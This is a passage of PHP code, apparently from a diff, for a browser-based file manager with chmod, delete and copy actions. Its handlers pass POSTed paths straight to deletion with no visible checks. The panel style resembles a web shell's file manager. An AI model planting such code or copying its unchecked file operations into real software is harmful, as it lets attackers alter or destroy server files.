+} $input_chmod = $html->input("text","mode","value=\"".$per."\"","Permission "); $input_chmod.= $html->submit("chmod","value=\">>\""); $form_chmod = $html->form("POST",$input_chmod); if(!empty($_GET['_act'])=="chmod")  $chmod_form = $form_chmod; else "";  foreach($option_oo as $name=>$val){ $opt .= $html->option($name,$val); } $select = $html->select("action",$opt,"class=\"input_m\"").$html->submit("sbmt","value=\">>\" "); $html->show($html->tr("<td colspan='9'>".$select." ".$view. " ".$chmod_form."</td>")); if(isset($_POST['sbmt'])){if(!empty($_POST['seldir'])){ $seldir = $_POST['seldir'];if($_POST['action']=='delete'){if(is_array($_POST['seldir'])){ foreach($seldir as $deldir){$act->delete($deldir);$html->show("<meta http-equiv='refresh' content='0;url='>"); }}else{$act->delete($seldir);$html->show("<meta http-equiv='refresh' content='0;url='>"); }}
 }
 if(!empty($_POST['selfile'])){ $selfile = $_POST['selfile']; 
 if($_POST['action']=='copy'){$_SESSION['files_select']= array();$n=0;foreach($_POST['selfile'] as $filesel){
